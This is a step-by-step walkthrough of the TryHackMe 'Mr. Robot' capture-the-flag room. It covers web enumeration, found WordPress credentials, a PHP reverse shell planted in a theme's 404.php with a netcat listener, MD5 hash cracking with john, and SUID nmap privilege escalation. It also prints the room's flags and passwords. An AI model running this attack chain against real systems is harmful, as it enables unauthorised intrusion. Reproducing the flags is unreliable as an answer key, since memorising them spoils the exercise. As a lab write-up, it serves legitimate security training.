# Mr. Robot

## [Mr. Robot on TryHackMe](https://tryhackme.com/room/mrrobot)

## Overview

* **Difficulty:** Medium
* **Category:** Web Exploitation / Privilege Escalation / CTF
* **Skills Practiced:** Web enumeration, credential discovery, WordPress exploitation, reverse shell, hash cracking, SUID privilege escalation

## Tools & Techniques

* `curl` – for retrieving hidden files
* `gobuster` – for directory brute-forcing
* `CyberChef` – for Base64 decoding
* WordPress admin panel – for uploading reverse shell
* `nc` (netcat) – for reverse shell listener
* `john` – for cracking password hashes
* `find`, SUID file enumeration – for privilege escalation
* GTFOBins (`nmap`) – to escalate privileges to root

## Walkthrough (Step-by-Step)

### 1. Deployment & Setup

* Connect to TryHackMe with OpenVPN or use the AttackBox.
* Deploy the **Mr. Robot** machine.

### 2. Initial Enumeration

1. **Check robots.txt**

	```bash
	curl http://<target-ip>/robots.txt
	```

	**Findings:**

	```
	fsocity.dic
	key-1-of-3.txt
	```

2. **Retrieve Key 1**

	```bash
	curl http://<target-ip>/key-1-of-3.txt
	```

	**Output:**

	```
	073403c8a58a1f80d943455fb30724b9
	```

	First key obtained.

3. **Extract Wordlist**

	```bash
	curl http://<target-ip>/fsocity.dic > dictionary.txt
	```

4. **Directory Enumeration (GoBuster)**

	```bash
	gobuster dir -u http://<target-ip>/ -w dictionary.txt
	```

	**Discovered:**

	```
	/license
	```

### 3. Credentials Discovery

* Visit `/license` → hidden Base64 string:

	```
	ZWxsaW90OkVSMjgtMDY1Mgo=
	```

* Decode with CyberChef →

	```
	elliot:ER28-0652
	```

	Found valid WordPress credentials.

### 4. Getting a Shell

1. **Login to WordPress**

	* URL: `http://<target-ip>/wp-login.php`
	* User: `elliot`
	* Pass: `ER28-0652`

2. **Exploit Theme Editor**

	* Replace contents of `404.php` with a [**PHP reverse shell**](reverse_shell.php).
	* Configure attacker IP and port.

3. **Start Listener**

	```bash
	nc -lvnp <port>
	```

4. **Trigger Reverse Shell**

	Visit `http://<target-ip>/wp-content/themes/<theme>/404.php`.

	**Result:**
	Shell access as `daemon`.

### 5. User Escalation (Robot)

1. **Enumerate Robot’s Files**

	```bash
	ls /home/robot
	```

	**Findings:**

	```
	key-2-of-3.txt  (permission denied)
	password.raw-md5
	```

2. **Retrieve Hash**

	```bash
	cat /home/robot/password.raw-md5
	```

	**Output:**

	```
	robot:c3fcd3d76192e4007dfb496cca67e13b
	```

3. **Crack Hash (John)**

	```bash
	john --format=raw-md5 -wordlist=/usr/share/wordlists/rockyou.txt hash.txt
	```

	**Result:**

	```
	robot:abcdefghijklmnopqrstuvwxyz
	```

4. **Spawn a proper TTY**

	```bash
	python -c 'import pty; pty.spawn("/bin/sh")'
	```

5. **Switch to Robot User**

	```bash
	su robot
	```

	Password: `abcdefghijklmnopqrstuvwxyz`

6. **Read Key 2**

	```bash
	cat /home/robot/key-2-of-3.txt
	```

	**Output:**

	```
	822c73956184f694993bede3eb39f959
	```

	Second key obtained.

### 6. Privilege Escalation (Root)

1. **Find SUID binaries**

	```bash
	find / -perm -4000 2>/dev/null
	```

	**Findings:**

	```
	/usr/bin/nmap
	```

2. **Exploit Nmap (GTFOBins)**

	```bash
	nmap --interactive
	nmap> !sh
	```

	**Result:** Root shell access.

3. **Read Key 3**

	```bash
	cd /root
	cat key-3-of-3.txt
	```

	**Output:**

	```
	04787ddef27c3dee1ee161b21670b4e4
	```

	Final key obtained.
